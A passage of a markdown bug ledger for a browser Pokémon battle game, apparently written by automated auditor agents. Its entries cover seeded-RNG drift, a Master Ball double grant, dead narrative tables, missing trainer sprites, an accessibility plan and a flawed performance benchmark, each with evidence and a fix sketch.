**Repro**: STORY_EVENTS_RAW row IDs are NOT array indices (intro Rival is array index 1 but row ID 68). `cityIndexFromEventIndex(ei)` walks `STORY_EVENTS_RAW[ei]` treating `ei` as an array index. `rollTrainerTeam` is called with `storyRowIdx = ev[0]` (row ID) and passes it through `_storyEvoStageCapForRow` → `cityIndexFromEventIndex(68)`, which (68 is past the 0–66 array) walks down to the last City row = City 9 → evo cap 2 (no restriction). The intro Rival therefore can field FULLY-EVOLVED Pokémon; the design intends City-0 basics-only (cap 0). Verified: `cityIndexFromEventIndex(68)=9, evoCap=2` vs correct `cityIndexFromEventIndex(1)=0, evoCap=0`. Three other rows also diverge (Basic Trainer idx14/id15, Rival idx19/id12, Elite Trainer idx57/id58). NOTE the SAME `storyRowIdx` is correctly a row ID for the sibling call `applyStoryProgressToGradeWeights` (which compares against row-ID constants STORY_GRADE_BIAS_ROW_*), so the fix belongs in `_storyEvoStageCapForRow`, not the caller.

**Blast radius**: Evo-stage cap for every trainer whose row ID ≠ array index — most visibly the intro Rival (the player's first fight) showing evolved forms it shouldn't. Mitigated for the intro Rival by its g4:100 gradeWeights (weak-BST pool), but the stage cap is still violated and the early-Rival case is exactly the one the code comment claims to protect ("only bites the early Rival").

**Fix sketch**: `_storyEvoStageCapForRow` should convert the row ID to an array index before calling `cityIndexFromEventIndex` — e.g. `const ai = STORY_EVENTS_RAW.findIndex(r => r && (r[0]|0) === (rowIdx|0)); return _storyEvoStageCapForCity(cityIndexFromEventIndex(ai));` — or accept an array index and have `rollTrainerTeam` pass the array index for the cap while keeping the row ID for the grade-bias call.

**Verification**: `rollTrainerTeam` for the intro Rival (row 68) yields only Stage-0 (unevolved) species; assert `_storyEvoStageCapForRow(68) === 0` after the fix.

---

## <a id="ISSUE-122"></a> ISSUE-122: Master Ball granted by BOTH villain-boss victory and post-HoF Caged God, vs spec "1 per run"

---
id: ISSUE-122
severity: P2
category: inconsistency
anchor_symbol: _storyGrantTrackEndReward
current_line_hint: ~41752
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 17b27a222658
confidence: medium
status: fixed-claude/cagedgod-excision
---

**Title**: Master Ball granted by BOTH villain-boss victory and post-HoF Caged God, vs spec "1 per run"

**Evidence**:
```js
// battle.html ~41756 — villain track boss reward (fires mid-run, road 7)
if (/^villain\.[a-zA-Z]+\.boss$/.test(sk)) {
    sm.balls.master = (sm.balls.master | 0) + 1;  // +1 Master Ball
}
// battle.html ~53505 — post-HoF gift (continuePostGame)
sm.balls.master = (sm.balls.master | 0) + 1;       // +1 Master Ball
```

**Repro**: STORY_MODE_FLOW.md §6 (line 147) caps Master Ball at "1 per run" and lists its source as "Boss arc reward (Underground broker)" only. But the 3-track villain boss (always fires once per run, since `sm.tracks.villain` is always populated at run start, ~34508) grants a Master Ball at ~road 7, and `continuePostGame` grants another post-HoF. That is up to 2 Master Balls per run — and the first arrives long before the Caged God.

**Blast radius**: Economy/balance: the Caged God's intended "Master Ball is the obvious solution" tension (§9 catch step) is undercut if the player already pocketed one from the villain boss. The spec's "1 per run" invariant is violated. Possible double-spend.

**Fix sketch**: Reconcile the two grant paths against the §6 cap. Either gate the villain-boss Master Ball behind a per-run flag shared with the post-HoF grant, or update §6 to document the 3-track villain-boss source and the actual cap (2). Balance numbers are user-owned — flag for sign-off.

**Verification**: Total Master Balls obtainable in one run matches the documented cap.

---

## <a id="ISSUE-123"></a> ISSUE-123: `_storyGrantTrackEndReward` has no internal idempotency guard — re-call double-grants Master Ball

---
id: ISSUE-123
severity: P2
category: bug
anchor_symbol: _storyGrantTrackEndReward
current_line_hint: ~42126
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6a29587124a9
confidence: high
status: fixed-claude/relaxed-bell-2X3Ys
---

**Title**: `_storyGrantTrackEndReward` has no internal idempotency guard — re-call double-grants Master Ball

**Evidence**:
```js
function _storyGrantTrackEndReward(beat) {
    if (!beat || !beat.sceneKey) return null;
    const sk = beat.sceneKey;
    if (/^villain\.[a-zA-Z]+\.boss$/.test(sk)) {
        sm.balls.master = (sm.balls.master | 0) + 1;   // unconditional, every call
        ...
    if (/^extra\.[a-zA-Z]+\.raid$/.test(sk)) { /* 6 vitamins, every call */ }
```

**Repro**: jsdom — `T.grantTrackEndReward({sceneKey:'villain.rocket.boss',kind:'boss'})` twice → `sm.balls.master` goes 0→1→2. Same with `extra.cubone.raid` → +12 vitamins (two bundles). The fn never checks `sm.storyEventsFired[sk]`.

**Blast radius**: Today both call sites (scene-queue `~42012`, battle-victory `~47572`) gate on `sm.storyEventsFired[sceneKey]` BEFORE/with the call, so normal play is safe. But the function is also exposed publicly as `window.__storyTest.grantTrackEndReward` / `StoryMode` PR-5 surface (`~37772`), and the Master Ball is meant to be unique/tracked. Any future caller (or a victory-hook refactor) that forgets the external gate silently double-grants the game's only Master Ball.

**Fix sketch**: Add a guard inside the fn: `if (sm.storyEventsFired && sm.storyEventsFired[sk] && sm._trackRewardGranted && sm._trackRewardGranted[sk]) return null;` then stamp a dedicated `sm._trackRewardGranted[sk]=true` on grant. Defense-in-depth independent of the caller's `storyEventsFired` flag.

**Verification**: re-run the double-call probe; second call returns null and leaves `sm.balls.master` unchanged.

---

## <a id="ISSUE-124"></a> ISSUE-124: Planned hatch animation + Fight Club transitions need reduced-motion + live-region design up front

---
id: ISSUE-124
severity: P2
category: a11y
anchor_symbol: _storyHatchRevealScene
current_line_hint: ~39815
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: bbbcf8f348ca
confidence: medium
status: open
---

**Title**: Planned hatch animation + Fight Club transitions need reduced-motion + live-region design up front

**Evidence**:
```js
function _storyHatchRevealScene(names) {
    // current reveal is TEXT-ONLY (_storyScene), SR-safe today
    _storyScene([{ accent:'#ffd54f', title:'Your Egg Hatched!', html:`The egg shudders, cracks...` }], ...);
}
```

**Repro**: Forward-looking. REDESIGN_PLAN §3b/§8b replaces this text reveal with an egg wiggle→crack→sprite-pop *animation* and adds Fight Club draft transitions, with no a11y constraints noted. Today's text reveal is accessible; the animation risks regressing it.

**Blast radius**: New daycare hatch scene + Fight Club draft/gauntlet screens. The existing global reduced-motion catch-all (L6660: `*{animation-duration:1ms}`) covers CSS keyframes, but a JS-driven sprite-pop sequence (cf. L9185 which already checks `prefers-reduced-motion`) must opt in explicitly.

**Fix sketch**: (a) Hatch animation: gate on `matchMedia('(prefers-reduced-motion: reduce)')` and fall back to the current text reveal (keep it, don't delete it); ensure the hatched-species name is announced via `role="status"`. (b) Draft picker: build as real buttons (see renderDraft finding) with focus moved to the grid on entry. (c) Gauntlet: announce each round result through a polite live region.

**Verification**: With reduced-motion on, hatch shows the still text reveal; draft is fully keyboard-operable; round wins/losses are announced.

---

## <a id="ISSUE-125"></a> ISSUE-125: `_storyPickMysteryIdentity` uses bare `Math.random()` — Mystery Figure roll diverges across seeded replays

---
id: ISSUE-125
severity: P2
category: bug
anchor_symbol: _storyPickMysteryIdentity
current_line_hint: ~28753
file: battle.html
agents: [story-mode-investigator]
fingerprint: 9e0788d6bed7
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `_storyPickMysteryIdentity` uses bare `Math.random()` — Mystery Figure roll diverges across seeded replays

**Evidence**:
```js
// battle.html ~28753
function _storyPickMysteryIdentity() {
    const allKeys = Object.keys(MYSTERY_FIGURE_IDENTITIES);
    ...
    let r = Math.random() * total;   // ← bare Math.random in biased branch
    ...
    return allKeys[Math.floor(Math.random() * allKeys.length)];  // ← bare in fallback
}
```

The mystery identity is pinned to `sm.mysteryIdentity` after first roll — so a single run is consistent. But two players sharing the same `?seed=X` (or one player retrying via deleteSave + same seed) get different Mystery Figure identities, breaking seeded-replay parity.

**Repro**: `localStorage.removeItem('pbs_story_save')`, then start two runs with the same seed via dev tools (force `sm.runSeed = 12345`). The two runs will diverge on `sm.mysteryIdentity` ≥ 80% of the time (8 keys, near-uniform).

**Blast radius**: Daily-seed contests, replay-share videos, the prior audit's "1.1 rival's secondary intro line uses bare Math.random" finding class. Identity choice affects sprite, intros, and outros across many scenes, so the divergence is highly visible.

**Fix sketch**: Replace both `Math.random()` calls with `(sm && sm.active) ? storyRngNext() : Math.random()` — same idiom as the wild-build / rival picks. Identity-bias preset path also.

**Verification**: After fix, two fresh runs with the same seed pick the same `sm.mysteryIdentity`. Existing saves migrate trivially — `sm.mysteryIdentity` is already pinned, so they keep whatever they rolled.

---

## <a id="ISSUE-126"></a> ISSUE-126: CSV-load cache invalidation pokes IIFE-private `_txMetaCache`/`_txGlobalMetaCached` — invalidation is dead

---
id: ISSUE-126
severity: P2
category: inconsistency
anchor_symbol: _txMetaCache
current_line_hint: ~9897
file: battle.html
agents: [consistency-auditor]
fingerprint: 092d23ae6973
confidence: high
status: open
---

**Title**: CSV-load cache invalidation pokes IIFE-private `_txMetaCache`/`_txGlobalMetaCached` — invalidation is dead

**Evidence**:
```js
// lines 9897-9898 and 9949-9950 (after builds.csv / API load, script-top scope)
try { if (typeof _txMetaCache !== 'undefined') _txMetaCache.clear(); } catch (e) {}
try { _txGlobalMetaCached = null; } catch (e) {}
```

**Repro**: `_txMetaCache` (47641) and `_txGlobalMetaCached` (47642) are declared inside the StoryMode IIFE with no `window.` export. `typeof _txMetaCache` is always `'undefined'` so `.clear()` never runs; the bare assignment to `_txGlobalMetaCached` throws ReferenceError that the bare `try/catch` silently swallows.

**Blast radius**: The tutor / dojo / nature-rater meta caches are never invalidated when builds.csv finishes loading, so any screen rendered before the CSV resolved keeps serving stale/empty popularity stats for the session. Same scope-leak class; the assignment site is the dangerous (throwing) variant, masked by an empty catch.

**Fix sketch**: Either expose an invalidator (e.g. `window.StoryMode.invalidateMetaCaches()`) called from the CSV loader, or move the cache invalidation logic inside the IIFE.

**Verification**: After lazy CSV load, confirm a tutor screen reflects the freshly-loaded sets rather than the pre-load baseline.

---

## <a id="ISSUE-127"></a> ISSUE-127: `_variantMysteryOutro` is dead — `_MYSTERY_OUTRO_BY_VARIANT` keyed only by retired identities, never matches `the_first`

---
id: ISSUE-127
severity: P2
category: bug
anchor_symbol: _variantMysteryOutro
current_line_hint: ~32744
file: battle.html
agents: [story-mode-investigator]
fingerprint: b77e444a2cf6
confidence: high
status: open
---

**Title**: `_variantMysteryOutro` is dead — `_MYSTERY_OUTRO_BY_VARIANT` keyed only by retired identities, never matches `the_first`

**Evidence**:
```js
const _MYSTERY_OUTRO_BY_VARIANT = {
    second_sun: { red: '...', cynthia: '...' },
    bone_keepers: { cyrus:'...', ghetsis:'...', lance:'...', red:'...' },
    ... static: { cartridge_self:'...', cyrus:'...', red:'...' }
};
function _variantMysteryOutro(identityKey) { ...; return table[identityKey] || ''; }
```
Every inner key is a RETIRED identity (`red/cynthia/cyrus/ghetsis/lance/n/buried_alive/cartridge_self`). `the_first` is never a key in this table (grep: the only `the_first:` in the file is in `MYSTERY_FIGURE_IDENTITIES`). Since `sm.mysteryIdentity` is now always `'the_first'` (PR-6 collapse), the call at `~47924` always returns `''`.

**Repro**: static — `MYSTERY_FIGURE_IDENTITIES` has exactly one key `the_first`; `_storyPickMysteryIdentity()` returns `'the_first'` deterministically (probe: `mfPicks:["the_first"]`). `_variantMysteryOutro('the_first')` → table lookup miss → `''` for all 8 variants.

**Blast radius**: ~38 lines of crafted per-variant Mystery Figure outro prose are unreachable. The MF reveal at `showVictoryOverlay` (`~47924`) always falls back to the generic `the_first.outro`. Lost fanservice/narrative variety; the per-storyline MF reading the spec promised never appears.

**Fix sketch**: Either (a) re-key the variant outros under `the_first` per storyline, or (b) delete `_MYSTERY_OUTRO_BY_VARIANT` + `_variantMysteryOutro` and the `~47924` call as dead code. Pasteur-owned (narrative + MF dispatch) — flag, don't edit.

**Verification**: with (a), MF outro at HoF reflects the active `sm.storyLine`; with (b), grep shows no remaining reference.

---

## <a id="ISSUE-128"></a> ISSUE-128: All ~30 per-variant Mystery-Figure outros are dead — keyed by retired identities, never match `the_first`

---
id: ISSUE-128
severity: P2
category: inconsistency
anchor_symbol: _variantMysteryOutro
current_line_hint: ~32937
file: battle.html
agents: [story-mode-investigator]
fingerprint: 910267b13380
confidence: high
status: open
---

**Title**: All ~30 per-variant Mystery-Figure outros are dead — keyed by retired identities, never match `the_first`

**Evidence**:
```js
const _MYSTERY_OUTRO_BY_VARIANT = {
  second_sun: { red:'…', cynthia:'…' }, bone_keepers:{ cyrus, ghetsis, lance, red }, … // keys = OLD identities
};
function _variantMysteryOutro(identityKey){ const t=_MYSTERY_OUTRO_BY_VARIANT[(sm&&sm.storyLine)||'classic']; return t? (t[identityKey]||'') : ''; }
// But _storyEnsureMysteryIdentity() ALWAYS returns 'the_first'; showVictoryOverlay calls
// _variantMysteryOutro(sm.mysteryIdentity) === _variantMysteryOutro('the_first') → always '' (no 'the_first' key).
```

**Repro**: `grep -n "_MYSTERY_OUTRO_BY_VARIANT" battle.html`; none of the inner keys is `the_first`. Beat the Mystery Figure on any non-classic variant — the variant outro is always empty, so the overlay falls back to `MYSTERY_FIGURE_IDENTITIES.the_first.outro` regardless of variant. (Confirms ledger ISSUE-107 still present; corrected understanding: variants ARE rolled randomly each run — see the variant-reachability finding — so this dead pool is hit by every non-classic run, not unreachable.)

**Blast radius**: ~30 hand-written per-variant outros (8 variants × 2-4 identities) never display. Dead content + maintenance confusion. Several of these outros (hypnos_lullaby.n: "Walk to the broker", project_mewtwo.cyrus: "magnetic key", lavender_frequency.buried_alive) point at the cut Caged-God arc, compounding the cut-residue issue.

**Fix sketch**: Re-key the table by `the_first` (one outro per variant), or delete the dead table and fold any worth-keeping prose into the single `the_first` identity. Tie to the Caged-God excision (Phase B) — drop the broker/cage-pointing lines.

**Verification**: Beating the Mystery Figure on each variant shows the variant-appropriate outro, OR the dead table is gone and `the_first.outro` is the single source.

---

## <a id="ISSUE-129"></a> ISSUE-129: FLOW §3 says wild grade is "keyed on sm.badges" via `_WILD_GRADE_CURVE_BY_BADGES`; shipped code keys it on city

---
id: ISSUE-129
severity: P2
category: inconsistency
anchor_symbol: _wildGradeWeightsForCity
current_line_hint: ~50174
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 5702133c4aaf
confidence: high
status: open
---

**Title**: FLOW §3 says wild grade is "keyed on sm.badges" via `_WILD_GRADE_CURVE_BY_BADGES`; shipped code keys it on city

**Evidence**:
```
STORY_MODE_FLOW.md:81  "Driven by a dedicated wild grade curve keyed on `sm.badges`
                        (0–8, see `_WILD_GRADE_CURVE_BY_BADGES`)."
```
```js
// battle.html ~50164 — shipped wild grade is a per-CITY table, not a per-badge curve:
const STORY_WILD_GRADE_BY_CITY = [ {g4:100}/*C0*/, ..., {g2:20,g3:50,g4:30}/*C7*/ ];
function _wildGradeWeightsForCity(city) { ... return STORY_WILD_GRADE_BY_CITY[c]; }
```

**Repro**: `node scripts/debug/symbol-index.mjs --lookup _WILD_GRADE_CURVE_BY_BADGES` → "not in index"; `grep -n _WILD_GRADE_CURVE_BY_BADGES battle.html` → 0 hits. The live wild roll resolves grade via `_wildGradeWeightsForCity(_wgCity)` (~50464) keyed on the arrived city index, not `sm.badges`. The catch-tutorial comment (~45972) also documents the city-keyed model (`STORY_WILD_GRADE_BY_CITY[0] = {g4:100}`).

**Blast radius**: Anyone tuning the wild curve from FLOW §3 would look for a non-existent `_WILD_GRADE_CURVE_BY_BADGES` keyed on badges (0–8) and, in sloppy-mode, branch on an undefined global. The keying axis itself differs (badges vs city) — these diverge whenever a city's pre/post-gym hubs share a city index but differ in badge count, so the doc predicts the wrong tier. (One stale ledger note at ~6613 even lists `_WILD_GRADE_CURVE_BY_BADGES` as if it exists.)

**Fix sketch**: Update FLOW §3 to: wild grade is a per-city table `STORY_WILD_GRADE_BY_CITY` resolved by `_wildGradeWeightsForCity(cityIdx)` (8 cities, C0–C7); drop the `sm.badges`/`_WILD_GRADE_CURVE_BY_BADGES` framing.

**Verification**: FLOW §3 names `STORY_WILD_GRADE_BY_CITY` / `_wildGradeWeightsForCity`; no doc references `_WILD_GRADE_CURVE_BY_BADGES`.

---

## <a id="ISSUE-130"></a> ISSUE-130: applyStatus dereferences `state.pActive.volatile.lockMove` / `state.fActive.volatile.lockMove` unconditionally (Uproar check) — throws if an active is null

---
id: ISSUE-130
severity: P2
category: bug
anchor_symbol: applyStatus
current_line_hint: ~26773
file: battle.html
agents: [battle-engine-debugger]
fingerprint: b90b810adcdc
confidence: medium
status: open
---

**Title**: applyStatus dereferences `state.pActive.volatile.lockMove` / `state.fActive.volatile.lockMove` unconditionally (Uproar check) — throws if an active is null

**Evidence**:
```js
// Uproar prevents sleep for all mons on the field
if (status === "SLP" && (state.pActive.volatile.lockMove === "Uproar" || state.fActive.volatile.lockMove === "Uproar")) {
    logMsg(`Uproar prevents sleep!`, 'info'); return;
}
```

**Repro**: Reasoning — most preceding guards in applyStatus key off `mon`, but this single line reaches into BOTH actives. If `applyStatus` is ever invoked (e.g. Synchronize mirror at 26799, or a delayed status from a field effect) while one side's active is momentarily null (post-faint, pre-replacement), `state.fActive.volatile.lockMove` throws. Caught only by the playTurn turn-skip handler.

**Blast radius**: Any status application (sleep/para/poison/burn) routed through this function. Lower likelihood than the other two (actives are usually both present during a move), hence P2.

**Fix sketch**: `const pUp = state.pActive && state.pActive.volatile && state.pActive.volatile.lockMove === "Uproar"; const fUp = ...; if (status === "SLP" && (pUp || fUp)) {...}`.

**Verification**: Call applyStatus(mon,"SLP") with `state.fActive = null`; assert it does not throw.

---

## <a id="ISSUE-131"></a> ISSUE-131: Mystery Figure HP boost is 1.35 in code but 1.50 in both balance docs (canonical-curve drift)

---
id: ISSUE-131
severity: P2
category: inconsistency
anchor_symbol: applyStoryLeagueFoeStatBoost
current_line_hint: ~35443
file: battle.html
agents: [battle-engine-debugger, spec-drift-auditor]
fingerprint: 775d00366828
confidence: high
status: open
---

**Title**: Mystery Figure HP boost is 1.35 in code but 1.50 in both balance docs (canonical-curve drift)

**Evidence**:
```js
// applyStoryLeagueFoeStatBoost (35442-35445): post-HoF Mystery
} else if (eventName === 'Mystery Figure' && rowIdx === STORY_POST_HOF_MYSTERY_ROW) {
    hpM = 1.35;   // docs say 1.50
    bulkM = 1.216;
    speM = 1.125;
}
// docs/PROGRESSION_CURVE_MASTER.md:131  "1.20 ×1.50ᴸ"   :181 "Mystery ×1.50"
```

**Repro**: `grep -n "Mystery.*1.50\|×1.50" docs/PROGRESSION_CURVE_MASTER.md` -> lines 131,181 say 1.50. Code `applyStoryLeagueFoeStatBoost` line 35443 = 1.35. Confirms STORY_OVERHAUL_PLAN §3 ("Mystery Figure HP boost = 1.35 (code) vs 1.50 (both docs)") with the exact live value. Measured net Mystery HP multiplier = 2.01× (band 1.30 × (stage 1.20 + 0.35)); at the doc's 1.50 it would be 1.30 × (1.20 + 0.50) = 2.21×.

**Blast radius**: Doc-vs-code only (no second code path). Misleads any future balance pass that trusts the doc as canon for the curve's gold-peak fight.

**Fix sketch**: Maintainer picks 1.35 or 1.50 (open decision §6.3 in the plan); then make the doc match the chosen code value (or vice-versa). Docs-only edit if 1.35 is kept.

**Verification**: `grep "Mystery" docs/PROGRESSION_CURVE_MASTER.md` matches the literal at battle.html:35443.

---

## <a id="ISSUE-132"></a> ISSUE-132: Dual-mega stone (Charizard/Mewtwo X vs Y) picked with bare Math.random — breaks seeded replay

---
id: ISSUE-132
severity: P2
category: bug
anchor_symbol: assignGimmickToBuild
current_line_hint: ~12450
file: battle.html
agents: [battle-engine-debugger]
fingerprint: ab9cb77f0970
confidence: high
status: fixed-claude/gracious-goodall-QFuQF
---

**Title**: Dual-mega stone (Charizard/Mewtwo X vs Y) picked with bare Math.random — breaks seeded replay

**Evidence**:
```js
// assignGimmickToBuild, MEGA branch (~12450)
let stone = MEGA_STONE_MAP[name];
if (Array.isArray(stone)) stone = stone[Math.floor(Math.random() * stone.length)]; // ← not seeded
```
`MEGA_STONE_MAP['Charizard'] = ['Charizardite X','Charizardite Y']` (same for Mewtwo). The
whole enemy-team roll is otherwise seeded through `_withEventSeededRng` / `storyRngNext` so a
battle reproduces across refresh/flee/revisit — but this one pick uses `Math.random()`, so the
X/Y outcome diverges between identical loads of the same seeded battle.

**Repro**: Story City 7+ with Mega unlocked + `megaOn`; face a Charizard signature (Blaine /
Leon / Red / Ash / Oak / Veteran Blaine pools). Refresh/flee+revisit the same seeded battle —
the foe can flip between Mega Charizard X and Y.

**Blast radius**: Not cosmetic — Charizard-Mega-X is Fire/Dragon, Tough Claws, physical; Mega-Y
is Fire/Flying, Drought, special. The foe's typing, ability, and threat profile change
non-deterministically, violating the static-roll reproducibility contract (CLAUDE.md: "use
seeded RNG everywhere user-visible; deterministic replays are part of the product"). Same code
path also affects Mewtwo X/Y (Mystery Figure / late aces).

**Fix sketch**: Use the seeded story stream for the array pick when a story run is active —
`(sm && sm.active && window.storyRngNext) ? window.storyRngNext : Math.random` — mirroring the
guard already used in rollTrainerTeam. One line; independent of the (descoped) signature
form-tagging feature.

**Verification**: Roll the same seeded City7+ Charizard-mega battle twice with the story RNG
reseeded between rolls; assert the chosen stone (X vs Y) is identical. Covered by the
trainer-rolls determinism pattern (`rollTrainerTeam: full build reproducible when BOTH rng
streams are reset`).

---

## <a id="ISSUE-133"></a> ISSUE-133: Team Yell villain track has no themed sprites — boss Piers falls back to generic Roughneck, mini-boss Marnie renders as Gladion

---
id: ISSUE-133
severity: P2
category: data
anchor_symbol: BEAT_CANON_TRAINER
current_line_hint: ~42431
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 2436e69a6d2e
confidence: high
status: open
---

**Title**: Team Yell villain track has no themed sprites — boss Piers falls back to generic Roughneck, mini-boss Marnie renders as Gladion

**Evidence**:
```js
'villain.yell.boss':      'Piers',     // TRAINER_DATA Piers = Gym Leader 7, no spriteFile
                                        //   → SPRITE_MAP['Piers']='Roughneck' (33582): generic class sprite
'villain.yell.miniBoss':  'Marnie',    // TRAINER_DATA Marnie row: spriteFile:'Gladion' (30111)
//   sprites/trainers/Piers.png  → MISSING ; Marnie shows Gladion.png (wrong character)
```

**Repro**: `BEAT_CANON_TRAINER` resolves both Spikemuth (`yell`) villain beats. Piers's TRAINER_DATA row (battle.html:30184) carries no `spriteFile`, so `_storyTrainerSprite` derives `Piers.png` → not present in `sprites/trainers/` → falls back through `SPRITE_MAP['Piers']='Roughneck'` (33582), a generic roughneck class sprite. Marnie's row (30111) hard-sets `spriteFile:'Gladion'`, so the Team Yell mini-boss renders as Gladion. `Cassiopeia.png` exists in sprites/trainers but is unused (Penny is the star.boss). Of all 10 villain tracks, only `yell` has neither a dedicated boss nor mini-boss sprite.

**Blast radius**: Requirement §2.4 ("a villain-arc battle must launch the themed villain trainer — correct sprite + signature"). The Team Yell run-line breaks both: the boss is a no-name Roughneck and the mini-boss wears a rival's (Gladion's) face. Signatures are correct (Piers→Obstagoon line; Marnie→Morpeko/Grimmsnarl), so only the sprite identity is wrong. Other 9 tracks resolve cleanly (verified: rocket/magma/aqua/galactic/plasma/flare/skull/macroCosmos/star all map to present sprites).

**Fix sketch**: Add `sprites/trainers/Piers.png` and `Marnie.png` (or point `villain.yell.*` at characters whose sprites exist), then set Piers's TRAINER_DATA row `spriteFile:'Piers'` and correct Marnie's `spriteFile:'Marnie'`. If Marnie's `spriteFile:'Gladion'` is intentional for her GYM-rival role, split the villain-track usage from the rival usage so the villain beat gets her own sprite.

**Verification**: `ls sprites/trainers/{Piers,Marnie}.png` succeeds; the `yell` boss/mini-boss battle intro shows Piers/Marnie, not Roughneck/Gladion.

---

## <a id="ISSUE-134"></a> ISSUE-134: `battle`-kind beats (main.battle1/battle2) launch a generic trainer, not a themed one — no canon override

---
id: ISSUE-134
severity: P2
category: inconsistency
anchor_symbol: BEAT_CANON_TRAINER
current_line_hint: ~42423
file: battle.html
agents: [story-mode-investigator]
fingerprint: 825b3fd7aee3
confidence: high
status: open
---

**Title**: `battle`-kind beats (main.battle1/battle2) launch a generic trainer, not a themed one — no canon override

**Evidence**:
```js
// enterBattleEvent: canon override only applies to boss/miniBoss/raid/mysteryBoss:
const _isInsertKind = _beatBattle.kind === 'boss' || _beatBattle.kind === 'miniBoss'
                    || _beatBattle.kind === 'raid' || _beatBattle.kind === 'mysteryBoss';
if (_canon && _isInsertKind) { sm.trainerAssignments[ev[0]|0] = _canon; … }
// MAIN_STORY_BEATS has kind:'battle' beats (battle1 @road5, battle2 @road7). Their scene prose
// ("Their team is your starter line plus mons that match yours uncannily") sets up a THEMED foe,
// but the fight is whatever the row's generic _generateBasicTrainer / assignment rolled.
```

**Repro**: road5 fires `main.battle1` ("A wandering veteran… 'You always lose this one.'") — the scene primes a specific eerie doppelgänger fight, but `_activeBattleBeatForCurrentRow` returns kind `battle`, which is NOT in `_isInsertKind`, so no trainer/team is themed. The player fights a random route trainer immediately after the doppelgänger prose. Beat-type ≠ actual trainer — the maintainer's 3(b) class.

**Blast radius**: MAIN `battle1` + `battle2` (every run). The villain `battle1`/`battle2` beats (kind `battle`) likewise theme nothing. Only the boss/miniBoss/raid beats deliver a themed encounter; the lower-tier `battle` beats are prose-only with a mismatched generic fight.

**Fix sketch**: Decide intent: if `battle`-kind beats should be themed, add canon entries + include `'battle'` in `_isInsertKind` (and a `_BEAT_BATTLE_TEAM` for the "mirror your team" main.battle1/battle2 fights). If they're intentionally prose-only, soften the scene prose so it doesn't promise a specific foe. (Comment at ~47468 says battle/miniRaid "keep theme via prose only" — but the prose describes a concrete opponent, so the contract is violated.)

**Verification**: After main.battle1's scene, the fight either matches the prose (themed mirror team) or the prose no longer implies a specific opponent.

---

## <a id="ISSUE-135"></a> ISSUE-135: Memory growth is benign (linear, ~25 KB/turn, R² = 0.712 — noise-dominated) and **does not indicate a leak**; the mandate's "60 turn / quadratic = P1" threshold is not hit

---
id: ISSUE-135
severity: P2
category: perf
anchor_symbol: benchMemoryGrowth
current_line_hint: 65
file: scripts/debug/perf-bench.mjs
agents: [performance-profiler]
fingerprint: a20dbf90774a
confidence: high
status: wontfix-not-a-bug-noise-dominated-growth-as-flagged-by-agent
---

**Title**: Memory growth is benign (linear, ~25 KB/turn, R² = 0.712 — noise-dominated) and **does not indicate a leak**; the mandate's "60 turn / quadratic = P1" threshold is not hit

**Evidence**: `scripts/debug/_repro/mem-growth.mjs` run with `--expose-gc`, 200 turns, sampling every 10:
```
heap @ turn  0  = 82.5 MB
heap @ turn 100 = 84.4 MB
heap @ turn 190 = 85.5 MB

Linear fit: heap = 0.0159 * turn + 82.50   R² = 0.712
Heap delta over 200 turns: 5.0 MB
Avg per-turn heap growth: 25.52 KB
```
Slope is essentially flat; R² = 0.712 indicates the linear trend explains only ~70% of variance — the rest is GC noise. Across 200 turns the heap moves 3 MB net, which is well within normal GC fluctuation for a 80+ MB resident set. **No leak.**

This finding documents the result so future runs have a baseline. Logged as P2 with `confidence: high` because the mandate explicitly asked us to check for quadratic growth across the 60-turn benchmark — the answer is "linear, slope ~0, not a leak", and that null result is worth recording.

**Repro**: `node --expose-gc scripts/debug/_repro/mem-growth.mjs`. Without `--expose-gc` the variance is higher (5–10 MB swings between samples) because GC is unpredictable; with it the trend stabilizes.

**Blast radius**: None. This is a "ruled out" finding, not a defect. If a future change introduces a quadratic-growth bug, this baseline will catch it: 25 KB/turn is the floor; anything > 250 KB/turn (10×) for ≥ 100 turns should be re-classified as P1.

**Fix sketch**: No fix needed. Consider adding a `--expose-gc` recommendation to the `perf-bench.mjs` output (it's already there at line 157) and treating > 250 KB/turn average growth as a regression threshold in CI.

**Verification**: Re-run `node --expose-gc scripts/debug/_repro/mem-growth.mjs` after any change to the turn loop; confirm slope remains < 0.05 MB/turn.

---

## <a id="ISSUE-136"></a> ISSUE-136: `perf-bench.mjs` calls `parseMoveEffects(move)` with the wrong arg-count; the reported 1.4 ms "median" is the cost of a thrown `TypeError`, not real per-move parsing

---
id: ISSUE-136
severity: P2
category: perf
anchor_symbol: benchParseMove
current_line_hint: 58
file: scripts/debug/perf-bench.mjs
agents: [performance-profiler]
fingerprint: c57a28528982
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `perf-bench.mjs` calls `parseMoveEffects(move)` with the wrong arg-count; the reported 1.4 ms "median" is the cost of a thrown `TypeError`, not real per-move parsing

**Evidence**:
```js
// scripts/debug/perf-bench.mjs:58
try { engine.parseMoveEffects(move); } catch (e) { /* malformed entry skipped */ }
```
The real signature is `parseMoveEffects(attacker, defender, move, isPlayer, _bouncedDepth)` (battle.html:24269). Calling with a single arg means `attacker = moveObject`, and the first line `let eff = (move.effectStr || move.eff || "").toLowerCase();` reads `move.effectStr` against `move = undefined` (the original move parameter), throwing `TypeError: Cannot read properties of undefined (reading 'effectStr')`. The harness then crashes after the bench loop is over because the final `catch` doesn't suppress the un-awaited Promise rejection from `parseMoveEffects` being `async`.

**Repro**: `node scripts/debug/perf-bench.mjs` produces `tests/reports/perf.md` with `Median: 1.438 ms 🚨 >2× over target`, then the process crashes with the TypeError above. The 1.438 ms number is the cost of *entering an async function, throwing, and creating a rejected Promise* — not the cost of actually parsing a move.

**Blast radius**: Misleading P2-style red flag in every CI / agent run. A drill-down (see `scripts/debug/_repro/parse-move-drill.mjs`) that calls `parseMoveEffects(attacker, defender, move, true)` correctly across all 950 moves with a valid attacker (Pikachu) and defender (Snorlax) measures a **median of 0.013 ms per call** — about 38× under the 0.5 ms target. parseMoveEffects is not actually slow.

**Fix sketch**: Replace line 58 with a properly-shaped call. The harness already exposes `mkMon`; the bench should set up an attacker, a defender, hook them onto `state.pActive` / `state.fActive`, and call `await engine.parseMoveEffects(attacker, defender, move, true)`. Also drop the `try/catch` swallowing the rejection — silently catching is what hid the bad shape originally. After the fix, the report should show a sub-millisecond median.

